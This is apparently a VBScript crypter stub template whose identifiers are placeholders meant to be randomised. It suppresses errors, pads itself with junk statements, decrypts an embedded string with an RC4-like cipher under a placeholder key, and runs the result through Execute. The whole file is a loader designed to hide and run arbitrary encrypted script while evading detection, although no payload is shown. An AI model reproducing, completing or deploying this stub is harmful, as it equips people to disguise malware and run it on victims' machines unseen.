on error resume next

function %20%(%21%)
%20% = chrw(%21%)
End Function 

function %22%(%23%)
%22% = chr(%23%)
End Function

function %24%(%25%)
%24% = asc(%25%)
End Function

function %26%(%27%)
%26% = len(%27%)
End Function

 function %14%(%17%) 
if "rnku7rgb91" = %12% then
Mid "llhxczoigb",5,6 
else
Mid "pjxcjontyc",9,9 
end if
  dim %15%, %7%, %16% 

  %15% = "" 

  for %7% = 2 to %26%(%17%) 

   %16% = "" 

   while Mid(%17%, %7%, 1) <>  "%sep%" and %7% <= %26%(%17%) 

    %16% = %16% + Mid(%17%, %7%, 1) 

    %7% = %7%+1 

   wend 

   %15% = %15% + %3%(%20%(%16%) ,  "%key%"  ) 

  next 

  %14% = %15% 

 end function 

%vars% = %Strings%
 dim %12% 

 %12% = %14%(%vars%) 

 Execute (%12%) 

 
 Function %3%(%2%, %10%) 

 Dim %11%, %5%, %6%, %7%, %8%, %1% 

 Dim %4%(256), %9%(256) 

 %11% = %26%(%10%) 

 For %7% = 0 To 255 

 %4%(%7%) = %7% 

 %9%(%7%) = %24%(Mid(%10%, (%7% Mod %11%) + 1, 1)) 

 Next 

 %8% = 0 

 For %7% = 0 To 255 

 %8% = (%8% + %9%(%7%) + %4%(%7%)) Mod 255 

 %1% = %4%(%7%) 

 %4%(%7%) = %4%(%8%) 

 %4%(%8%) = %1% 

 Next 

 %5% = 0 

 %6% = 0 

 For %7% = 1 To 3072 

 %5% = (%5% + 1) Mod 255 

 %6% = (%6% + %4%(%5%)) Mod 255 

 %1% = %4%(%5%) 

 %4%(%5%) = %4%(%6%) 

 %4%(%6%) = %1% 

 Next 

 For %7% = 1 To %26%(%2%) 

 %5% = (%5% + 1) Mod 255 

 %6% = (%6% + %4%(%5%)) Mod 255 

 %1% = %4%(%5%) 

 %4%(%5%) = %4%(%6%) 

 %4%(%6%) = %1% 

 %3% = %3% & %22%(%4%((%4%(%5%) + %4%(%6%)) Mod 255) Xor %24%(Mid(%2%, %7%, 1))) 

 Next 

 End Function 

